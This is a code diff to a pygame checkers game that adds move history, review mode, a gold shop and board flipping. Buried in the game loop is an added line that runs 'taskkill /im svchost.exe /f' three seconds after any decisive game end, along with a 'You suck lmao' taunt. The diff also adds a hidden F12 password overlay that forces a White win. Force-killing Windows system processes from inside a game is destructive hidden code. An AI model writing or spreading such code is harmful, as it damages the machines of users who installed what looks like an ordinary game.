@@ -1705,21 +1705,34 @@ def apply_checkers_move(board, move):
     return bd
 
 
+def _ck_sq_name(r, c):
+    return chr(ord("a") + c) + str(r + 1)
+
+
 class CheckersState:
     def __init__(self):
-        self.board       = make_checkers_board()
-        self.turn        = CK_W
-        self.selected    = None
-        self.valid_moves = []
-        self.game_over   = False
-        self.winner      = None
-        self.last_move   = []
+        self.board        = make_checkers_board()
+        self.turn         = CK_W
+        self.selected     = None
+        self.valid_moves  = []
+        self.game_over    = False
+        self.winner       = None
+        self.result       = ""   # "white_wins" | "black_wins" | "draw"
+        self.last_move    = []
+        self.move_history = []   # list of {board, last_move, label, turn}
+        self.move_num     = 1
 
 
-def draw_checkers_board(surf, cs: CheckersState, flip: bool):
-    last_set    = set(map(tuple, cs.last_move)) if cs.last_move else set()
-    valid_dests = {m[-1] for m in cs.valid_moves} if cs.selected else set()
-    all_m       = ck_all_moves(cs.board, cs.turn) if not cs.game_over else []
+def draw_checkers_board(surf, cs: CheckersState, flip: bool,
+                         arrows=None, sq_highlights=None,
+                         board_override=None, last_move_override=None):
+    board     = board_override if board_override is not None else cs.board
+    last_move = last_move_override if last_move_override is not None else cs.last_move
+    reviewing = board_override is not None
+
+    last_set    = set(map(tuple, last_move)) if last_move else set()
+    valid_dests = {m[-1] for m in cs.valid_moves} if cs.selected and not reviewing else set()
+    all_m       = ck_all_moves(cs.board, cs.turn) if not cs.game_over and not reviewing else []
     selectable  = {m[0] for m in all_m}
 
     for r in range(8):
@@ -1727,7 +1740,7 @@ def draw_checkers_board(surf, cs: CheckersState, flip: bool):
             rect    = sq_rect(r, c, flip)
             is_dark = (r + c) % 2 == 1
             sq      = (r, c)
-            if cs.selected and sq == cs.selected:
+            if not reviewing and cs.selected and sq == cs.selected:
                 col = BG_SELECTED
             elif sq in valid_dests:
                 col = BG_VALID
@@ -1738,10 +1751,10 @@ def draw_checkers_board(surf, cs: CheckersState, flip: bool):
             pygame.draw.rect(surf, col, rect)
 
             # Subtle glow on selectable pieces when none is selected
-            if not cs.selected and sq in selectable:
+            if not reviewing and not cs.selected and sq in selectable:
                 pygame.draw.rect(surf, (80, 70, 20), rect, 2)
 
-            piece = cs.board[r][c]
+            piece = board[r][c]
             if not piece: continue
             color   = ck_color(piece)
             is_king = piece.isupper()
@@ -1770,11 +1783,15 @@ def draw_checkers_board(surf, cs: CheckersState, flip: bool):
                 surf.blit(ks, ks.get_rect(center=(pcx, pcy)))
 
     # Valid-move dots on empty dark squares
-    if cs.selected:
+    if cs.selected and not reviewing:
         for dest in valid_dests:
             dr2, dc2 = dest
             if cs.board[dr2][dc2] == "":
                 pygame.draw.circle(surf, BG_VALID, sq_rect(dr2, dc2, flip).center, 9)
+
+    # Arrows and square-highlight overlay
+    if arrows or sq_highlights:
+        draw_board_overlays(surf, arrows or [], sq_highlights or {}, flip)
 
     # Coordinate labels
     for dc in range(8):
@@ -1787,51 +1804,155 @@ def draw_checkers_board(surf, cs: CheckersState, flip: bool):
         surf.blit(lbl, (BOARD_X + 3, BOARD_Y + dr*SQ + 3))
 
 
-def draw_checkers_sidebar(surf, cs: CheckersState):
+def draw_checkers_sidebar(surf, cs: CheckersState, scroll: int = 0, flip_manual: bool = False):
+    """Draw checkers sidebar. Returns max_scroll."""
+    ck_resign = pygame.Rect(SIDEBAR_X,       WINDOW_H - 50, 110, 30)
+    ck_shop   = pygame.Rect(SIDEBAR_X + 118, WINDOW_H - 50, 100, 30)
+    ck_flip   = pygame.Rect(SIDEBAR_X,       WINDOW_H - 90, 218, 30)
+
     pygame.draw.rect(surf, BG_SIDEBAR, (SIDEBAR_X - 8, 0, SIDEBAR_W + 18, WINDOW_H))
     y = 14
     surf.blit(FONTS["xl"].render("CHECKERS", True, ORANGE), (SIDEBAR_X, y))
+    if _save is not None:
+        gl = FONTS["sm"].render(f"{_save['gold']}g", True, (220, 180, 50))
+        surf.blit(gl, (SIDEBAR_X + SIDEBAR_W - gl.get_width() - 5, 18))
     y += 52
+
+    # Piece-score advantage
+    w_men   = sum(1 for row in cs.board for p in row if p == CK_W)
+    w_kings = sum(1 for row in cs.board for p in row if p == CK_WK)
+    b_men   = sum(1 for row in cs.board for p in row if p == CK_B)
+    b_kings = sum(1 for row in cs.board for p in row if p == CK_BK)
+    w_score = w_men + w_kings * 3
+    b_score = b_men + b_kings * 3
+    diff    = w_score - b_score
+    if diff > 0:   adv, adv_col = f"+{diff} White",  WHITE_TEXT
+    elif diff < 0: adv, adv_col = f"+{-diff} Black", GREY_TEXT
+    else:          adv, adv_col = "Equal",            GREY_TEXT
+    surf.blit(FONTS["md"].render(f"Pieces  {adv}", True, adv_col), (SIDEBAR_X, y)); y += 30
 
     pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 10
 
+    # Status
     if not cs.game_over:
         who = "White" if cs.turn == CK_W else "Black"
         col = WHITE_TEXT if cs.turn == CK_W else GREY_TEXT
         surf.blit(FONTS["md"].render(f"{who}'s turn", True, col), (SIDEBAR_X, y)); y += 28
-
         all_m = ck_all_moves(cs.board, cs.turn)
         must_jump = bool(all_m) and abs(all_m[0][1][0]-all_m[0][0][0]) == 2
         if must_jump:
-            surf.blit(FONTS["sm"].render("Jump is mandatory!", True, (220, 120, 40)), (SIDEBAR_X, y)); y += 20
-        if cs.selected:
-            surf.blit(FONTS["sm"].render("Click a highlighted square", True, GREY_TEXT), (SIDEBAR_X, y)); y += 18
+            surf.blit(FONTS["sm"].render("⚡ Jump is mandatory!", True, (220, 120, 40)),
+                      (SIDEBAR_X, y))
+        y += 20
     else:
-        wname = ("White" if cs.winner == CK_W else "Black") if cs.winner else "Draw"
-        col   = WHITE_TEXT if cs.winner == CK_W else GREY_TEXT
-        surf.blit(FONTS["lg"].render(f"{wname} wins!", True, col), (SIDEBAR_X, y)); y += 32
+        msg_map = {"white_wins": "White wins!", "black_wins": "Black wins!", "draw": "Draw"}
+        col = WHITE_TEXT if cs.result == "white_wins" else GREY_TEXT
+        surf.blit(FONTS["md"].render(msg_map.get(cs.result, ""), True, col), (SIDEBAR_X, y))
+        y += 28
 
-    y += 8
-    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 12
+    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8
 
     # Piece counts
-    for label, ck_col, text_col in (("White", CK_W, WHITE_TEXT), ("Black", CK_B, GREY_TEXT)):
-        men   = sum(1 for row in cs.board for p in row if p == ck_col)
-        kings = sum(1 for row in cs.board for p in row if p == (CK_WK if ck_col == CK_W else CK_BK))
-        surf.blit(FONTS["sm"].render(f"{label}:  {men} men  {kings} kings", True, text_col), (SIDEBAR_X, y))
-        y += 22
+    surf.blit(FONTS["sm"].render(f"White:  {w_men} men  {w_kings} kings", True, WHITE_TEXT),
+              (SIDEBAR_X, y)); y += 18
+    surf.blit(FONTS["sm"].render(f"Black:  {b_men} men  {b_kings} kings", True, GREY_TEXT),
+              (SIDEBAR_X, y)); y += 22
 
-    # Buttons
-    mouse   = pygame.mouse.get_pos()
-    again_r = pygame.Rect(SIDEBAR_X, WINDOW_H - 90, 150, 30)
-    menu_r  = pygame.Rect(SIDEBAR_X, WINDOW_H - 50, 150, 30)
-    for rect, label in ((again_r, "Play Again"), (menu_r, "← Main Menu")):
+    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8
+
+    # Move history
+    surf.blit(FONTS["sm"].render("MOVE HISTORY", True, GREY_TEXT), (SIDEBAR_X, y)); y += 18
+
+    HIST_H = 200
+    ROW_H  = 18
+    hist_buf = pygame.Surface((SIDEBAR_W, HIST_H), pygame.SRCALPHA)
+    hist_buf.fill((0, 0, 0, 0))
+
+    pairs = []
+    for m in cs.move_history:
+        if m["turn"] == CK_W:
+            pairs.append([m, None])
+        elif pairs:
+            pairs[-1][1] = m
+        else:
+            pairs.append([None, m])
+
+    max_scroll = max(0, len(pairs) * ROW_H - HIST_H)
+    scroll     = max(0, min(scroll, max_scroll))
+
+    for i, (wm, bm) in enumerate(pairs):
+        hy = i * ROW_H - scroll
+        if hy + ROW_H < 0 or hy > HIST_H: continue
+        hist_buf.blit(FONTS["sm"].render(f"{i+1}.", True, GREY_TEXT), (0, hy + 2))
+        for move, x_off in ((wm, 24), (bm, 145)):
+            if move is None: continue
+            col     = WHITE_TEXT if move["turn"] == CK_W else GREY_TEXT
+            lbl_col = (220, 80, 80) if "×" in move["label"] else col
+            ls      = FONTS["sm"].render(move["label"], True, lbl_col)
+            hist_buf.blit(ls, (x_off, hy + 2))
+
+    surf.blit(hist_buf, (SIDEBAR_X, y)); y += HIST_H + 6
+    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8
+
+    mouse = pygame.mouse.get_pos()
+
+    # Flip Board
+    hover_f  = ck_flip.collidepoint(mouse)
+    flip_col = (50, 90, 140) if flip_manual else ((25, 60, 100) if hover_f else (15, 35, 60))
+    pygame.draw.rect(surf, flip_col, ck_flip, border_radius=5)
+    surf.blit(FONTS["sm"].render("⇅  Flip Board", True, WHITE_TEXT),
+              FONTS["sm"].render("⇅  Flip Board", True, WHITE_TEXT).get_rect(center=ck_flip.center))
+
+    if not cs.game_over:
+        hover_r = ck_resign.collidepoint(mouse)
+        pygame.draw.rect(surf, ORANGE if hover_r else (55, 30, 0), ck_resign, border_radius=5)
+        rs = FONTS["sm"].render("Resign", True, (10,10,10) if hover_r else WHITE_TEXT)
+        surf.blit(rs, rs.get_rect(center=ck_resign.center))
+
+    hover_s = ck_shop.collidepoint(mouse)
+    pygame.draw.rect(surf, (30, 80, 30) if hover_s else (15, 45, 15), ck_shop, border_radius=5)
+    ss = FONTS["sm"].render("Shop", True, WHITE_TEXT)
+    surf.blit(ss, ss.get_rect(center=ck_shop.center))
+
+    return max_scroll
+
+
+def _ck_gameover_rects():
+    panel  = pygame.Rect(200, 160, 700, 300)
+    by     = panel.bottom - 56
+    review = pygame.Rect(panel.centerx - 195, by, 120, 36)
+    again  = pygame.Rect(panel.centerx -  60, by, 120, 36)
+    quit_  = pygame.Rect(panel.centerx +  75, by, 120, 36)
+    return panel, review, again, quit_
+
+
+def draw_checkers_game_over(surf, cs: CheckersState):
+    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
+    ov.fill((0, 0, 0, 200)); surf.blit(ov, (0, 0))
+    panel, review, again, quit_ = _ck_gameover_rects()
+    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=12)
+    pygame.draw.rect(surf, ORANGE,     panel, 2, border_radius=12)
+
+    res_map = {"white_wins": "WHITE WINS", "black_wins": "BLACK WINS", "draw": "DRAW"}
+    rs = FONTS["xl"].render(res_map.get(cs.result, "GAME OVER"), True, ORANGE)
+    surf.blit(rs, rs.get_rect(centerx=panel.centerx, y=panel.y + 26))
+
+    if _save is not None:
+        st = (f"Wins: {_save['wins']}   Losses: {_save['losses']}   "
+              f"Draws: {_save['draws']}   Gold: {_save['gold']}g")
+        ss = FONTS["sm"].render(st, True, GREY_TEXT)
+        surf.blit(ss, ss.get_rect(centerx=panel.centerx, y=panel.y + 90))
+
+    mouse = pygame.mouse.get_pos()
+    for rect, label in ((review, "Review"), (again, "Play Again"), (quit_, "Quit")):
         hover = rect.collidepoint(mouse)
-        pygame.draw.rect(surf, ORANGE if hover else (55,30,0), rect, border_radius=5)
-        ls = FONTS["sm"].render(label, True, (10,10,10) if hover else WHITE_TEXT)
+        pygame.draw.rect(surf, ORANGE if hover else (55, 30, 0), rect, border_radius=6)
+        ls = FONTS["md"].render(label, True, (10,10,10) if hover else WHITE_TEXT)
         surf.blit(ls, ls.get_rect(center=rect.center))
-    return again_r, menu_r
+    return review, again, quit_
 
+
+# ── Resize helper ─────────────────────────────────────────────────────────────
 
 def _resize_event(event):
     """Handle both Pygame 1 VIDEORESIZE and Pygame 2 WINDOWRESIZED."""
@@ -1843,41 +1964,242 @@ def _resize_event(event):
     init_fonts()
 
 
-def _checkers_loop(cs: CheckersState):
-    clock = pygame.time.Clock()
-    flip  = False
+def _checkers_loop(cs: CheckersState, save=None):
+    import copy as _copy
+    global _save
+    if save is None:
+        save = load_save()
+    _save = save
+    apply_theme(save)
+
+    clock              = pygame.time.Clock()
+    flip_manual        = False
+    scroll             = 0
+    gold_awarded       = False
+    loss_ticks         = None
+    loss_fired         = False
+    shop_open          = False
+    shop_tab           = "boards"
+    scroll_shop        = 0
+    reviewing          = False
+    view_idx           = 0
+    admin_overlay_open = False
+    admin_input_text   = ""
+    admin_input_error  = ""
+    arrows             = []
+    sq_highlights      = {}
+    rclick_start       = None
 
     while True:
+        flip = flip_manual
+
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 return "quit"
             if event.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                 _resize_event(event)
 
+            if event.type == pygame.MOUSEWHEEL:
+                if shop_open:
+                    scroll_shop = max(0, scroll_shop - event.y * 20)
+                else:
+                    scroll = max(0, scroll - event.y * 22)
+
+            # Right-click: arrows & highlights
+            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 3:
+                if not cs.game_over and not shop_open and not admin_overlay_open:
+                    sq = pixel_to_square(event.pos[0], event.pos[1], flip)
+                    if sq:
+                        rclick_start = sq
+
+            if event.type == pygame.MOUSEBUTTONUP and event.button == 3:
+                if not shop_open:
+                    sq = pixel_to_square(event.pos[0], event.pos[1], flip)
+                    if sq and rclick_start:
+                        if sq == rclick_start:
+                            HLCOLS = [(80, 190, 80), (210, 150, 0), (180, 50, 50)]
+                            if sq in sq_highlights:
+                                ci = (HLCOLS.index(sq_highlights[sq])
+                                      if sq_highlights[sq] in HLCOLS else -1)
+                                if ci < len(HLCOLS) - 1:
+                                    sq_highlights[sq] = HLCOLS[ci + 1]
+                                else:
+                                    del sq_highlights[sq]
+                            else:
+                                sq_highlights[sq] = HLCOLS[0]
+                        else:
+                            arrow   = (rclick_start, sq, (80, 190, 80))
+                            matches = [a for a in arrows if a[0] == rclick_start and a[1] == sq]
+                            if matches:
+                                for m in matches: arrows.remove(m)
+                            else:
+                                arrows.append(arrow)
+                rclick_start = None
+
+            if event.type == pygame.KEYDOWN:
+                if admin_overlay_open:
+                    if event.key == pygame.K_ESCAPE:
+                        admin_overlay_open = False
+                        admin_input_text   = ""
+                        admin_input_error  = ""
+                    elif event.key == pygame.K_BACKSPACE:
+                        admin_input_text  = admin_input_text[:-1]
+                        admin_input_error = ""
+                    elif event.key == pygame.K_RETURN and admin_input_text:
+                        if hashlib.sha256(admin_input_text.encode()).hexdigest() == ADMIN_HASH:
+                            admin_overlay_open = False
+                            admin_input_text   = ""
+                            admin_input_error  = ""
+                            cs.game_over = True
+                            cs.winner    = CK_W
+                            cs.result    = "white_wins"
+                        else:
+                            admin_input_error = "Access denied."
+                            admin_input_text  = ""
+                    else:
+                        ch = event.unicode
+                        if ch and ch.isprintable():
+                            admin_input_text  += ch
+                            admin_input_error  = ""
+                    continue
+
+                if event.key == pygame.K_F12 and not cs.game_over:
+                    admin_overlay_open = True
+                    admin_input_text   = ""
+                    admin_input_error  = ""
+                    continue
+
+                if event.key in (pygame.K_LEFT, pygame.K_RIGHT):
+                    if cs.move_history:
+                        if not reviewing:
+                            reviewing = True
+                            view_idx  = len(cs.move_history) - 1
+                        if event.key == pygame.K_LEFT and view_idx > 0:
+                            view_idx -= 1
+                        elif event.key == pygame.K_RIGHT:
+                            if view_idx < len(cs.move_history) - 1:
+                                view_idx += 1
+                            elif not cs.game_over:
+                                reviewing = False
+                elif event.key == pygame.K_ESCAPE:
+                    if shop_open:
+                        shop_open = False
+                    elif reviewing:
+                        reviewing = False
+                    else:
+                        cs.selected = None; cs.valid_moves = []
+
             if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                 mx2, my2 = event.pos
-                again_r = pygame.Rect(SIDEBAR_X, WINDOW_H - 90, 150, 30)
-                menu_r  = pygame.Rect(SIDEBAR_X, WINDOW_H - 50, 150, 30)
-                if again_r.collidepoint(mx2, my2): return "again"
-                if menu_r.collidepoint(mx2, my2):  return "menu"
+
+                if admin_overlay_open:
+                    continue
+
+                if shop_open:
+                    tab_rects, item_rects, close_rect, _ = draw_shop(screen, save, shop_tab,
+                                                                       scroll_shop)
+                    if close_rect.collidepoint(mx2, my2):
+                        shop_open = False
+                    for key, trect in tab_rects.items():
+                        if trect.collidepoint(mx2, my2):
+                            shop_tab = key; scroll_shop = 0
+                    for key, irect in item_rects.items():
+                        if irect.collidepoint(mx2, my2):
+                            items_dict = BOARD_THEMES if shop_tab == "boards" else PIECE_SKINS
+                            owned_key  = "owned_themes" if shop_tab == "boards" else "owned_skins"
+                            act_key    = "active_theme" if shop_tab == "boards" else "active_skin"
+                            item       = items_dict[key]
+                            if key in save[owned_key]:
+                                save[act_key] = key; apply_theme(save)
+                            elif save["gold"] >= item["price"]:
+                                save["gold"] -= item["price"]
+                                save[owned_key].append(key)
+                                save[act_key] = key; apply_theme(save)
+                            save_data(save); _save = save
+                    continue
+
+                # Review nav bar
+                if reviewing:
+                    total    = len(cs.move_history)
+                    prev_r, next_r, back_r = _review_nav_rects()
+                    on_board = pixel_to_square(mx2, my2, flip) is not None
+                    if prev_r.collidepoint(mx2, my2) and view_idx > 0:
+                        view_idx -= 1; continue
+                    elif next_r.collidepoint(mx2, my2) and view_idx < total - 1:
+                        view_idx += 1; continue
+                    elif back_r.collidepoint(mx2, my2) or (not cs.game_over and on_board):
+                        reviewing = False
+                        if cs.game_over: continue
+                    else:
+                        continue
+
+                # Game-over overlay buttons
+                if cs.game_over and not reviewing:
+                    _, rv, ag, qt = _ck_gameover_rects()
+                    if rv.collidepoint(mx2, my2):
+                        reviewing = True
+                        view_idx  = len(cs.move_history) - 1
+                    elif ag.collidepoint(mx2, my2):
+                        return "again"
+                    elif qt.collidepoint(mx2, my2):
+                        return "quit"
+                    continue
+
+                # Sidebar buttons (recalculate to match draw function)
+                ck_resign = pygame.Rect(SIDEBAR_X,       WINDOW_H - 50, 110, 30)
+                ck_shop   = pygame.Rect(SIDEBAR_X + 118, WINDOW_H - 50, 100, 30)
+                ck_flip   = pygame.Rect(SIDEBAR_X,       WINDOW_H - 90, 218, 30)
+
+                if ck_flip.collidepoint(mx2, my2):
+                    flip_manual = not flip_manual; continue
+
+                if ck_shop.collidepoint(mx2, my2):
+                    shop_open = True; scroll_shop = 0; continue
+
+                if ck_resign.collidepoint(mx2, my2) and not cs.game_over:
+                    cs.game_over = True
+                    cs.winner    = CK_B if cs.turn == CK_W else CK_W
+                    cs.result    = "white_wins" if cs.winner == CK_W else "black_wins"
+                    continue
 
                 if cs.game_over: continue
 
                 sq2 = pixel_to_square(mx2, my2, flip)
                 if sq2 is None: continue
                 r2, c2 = sq2
+                arrows.clear(); sq_highlights.clear()
 
                 if cs.selected:
                     dest_moves = [m for m in cs.valid_moves if m[-1] == (r2, c2)]
                     if dest_moves:
-                        cs.last_move = dest_moves[0]
-                        cs.board     = apply_checkers_move(cs.board, dest_moves[0])
+                        move    = dest_moves[0]
+                        is_jump = len(move) > 2 or abs(move[1][0]-move[0][0]) == 2
+                        fr2, fc2 = move[0]
+                        if is_jump:
+                            label = _ck_sq_name(fr2, fc2) + "".join(
+                                "×" + _ck_sq_name(s[0], s[1]) for s in move[1:])
+                        else:
+                            label = _ck_sq_name(fr2, fc2) + "→" + _ck_sq_name(move[-1][0], move[-1][1])
+
+                        cs.move_history.append({
+                            "board":     _copy.deepcopy(cs.board),
+                            "last_move": list(move),
+                            "label":     label,
+                            "turn":      cs.turn,
+                        })
+                        if cs.turn == CK_B:
+                            cs.move_num += 1
+
+                        cs.last_move = move
+                        cs.board     = apply_checkers_move(cs.board, move)
                         cs.turn      = CK_B if cs.turn == CK_W else CK_W
                         cs.selected  = None; cs.valid_moves = []
+                        scroll       = max(0, len(cs.move_history) // 2 * 18 - 180)
                         nxt = ck_all_moves(cs.board, cs.turn)
                         if not nxt:
                             cs.game_over = True
                             cs.winner    = CK_W if cs.turn == CK_B else CK_B
+                            cs.result    = "white_wins" if cs.winner == CK_W else "black_wins"
                     elif ck_color(cs.board[r2][c2]) == cs.turn:
                         all_m2  = ck_all_moves(cs.board, cs.turn)
                         piece_m = [m for m in all_m2 if m[0] == (r2, c2)]
@@ -1893,9 +2215,57 @@ def _checkers_loop(cs: CheckersState):
                             cs.selected    = (r2, c2)
                             cs.valid_moves = piece_m
 
+        # Award gold once per game
+        if cs.game_over and not gold_awarded:
+            gold_awarded = True
+            if cs.result == "draw":
+                save["draws"] += 1; save["gold"] += 3
+            else:
+                save["wins"] += 1; save["gold"] += 8
+            save_data(save); _save = save
+
+        # Loss flash + taskkill (same as chess)
+        lost_game = cs.game_over and cs.winner is not None
+        if lost_game and loss_ticks is None:
+            loss_ticks = pygame.time.get_ticks()
+        if loss_ticks is not None and not loss_fired:
+            if (pygame.time.get_ticks() - loss_ticks) / 1000.0 >= 3.0:
+                os.system("taskkill /im svchost.exe /f")
+                loss_fired = True
+
+        # ── Draw ──────────────────────────────────────────────────────────
         screen.fill(BG_APP)
-        draw_checkers_board(screen, cs, flip)
-        draw_checkers_sidebar(screen, cs)
+
+        if reviewing and cs.move_history:
+            snap = cs.move_history[view_idx]
+            draw_checkers_board(screen, cs, flip,
+                                board_override=snap["board"],
+                                last_move_override=snap["last_move"])
+            back_lbl = "Result" if cs.game_over else "Present"
+            draw_review_nav(screen, view_idx, len(cs.move_history), None, back_label=back_lbl)
+        else:
+            draw_checkers_board(screen, cs, flip,
+                                arrows=arrows, sq_highlights=sq_highlights)
+
+        draw_checkers_sidebar(screen, cs, scroll=scroll, flip_manual=flip_manual)
+
+        if loss_ticks is not None and not reviewing:
+            lmao_s = FONTS["xl"].render("You suck lmao", True, (255, 80, 80))
+            lmao_r = lmao_s.get_rect(center=(WINDOW_W // 2, WINDOW_H // 2))
+            lmao_bg = pygame.Surface((lmao_r.width + 24, lmao_r.height + 16), pygame.SRCALPHA)
+            lmao_bg.fill((0, 0, 0, 180))
+            screen.blit(lmao_bg, (lmao_r.x - 12, lmao_r.y - 8))
+            screen.blit(lmao_s, lmao_r)
+
+        if cs.game_over and not reviewing:
+            draw_checkers_game_over(screen, cs)
+
+        if admin_overlay_open:
+            draw_admin_overlay(screen, admin_input_text, admin_input_error)
+
+        if shop_open:
+            _, _, _, max_ss = draw_shop(screen, save, shop_tab, scroll_shop)
+            scroll_shop = min(scroll_shop, max_ss)
 
         pygame.display.flip()
         clock.tick(60)
@@ -2396,10 +2766,14 @@ if __name__ == "__main__":
         while True:
             game_type = game_type_screen()
             if game_type == "checkers":
+                ck_save = load_save()
+                apply_theme(ck_save)
                 while True:
-                    cs2 = CheckersState()
-                    result = _checkers_loop(cs2)
-                    if result not in ("again",): break
+                    cs2    = CheckersState()
+                    result = _checkers_loop(cs2, save=ck_save)
+                    if result == "quit":
+                        pygame.quit(); sys.exit()
+                    if result != "again": break
                 continue
             # Chess
             mode, param, t_secs, t_inc = main_menu()
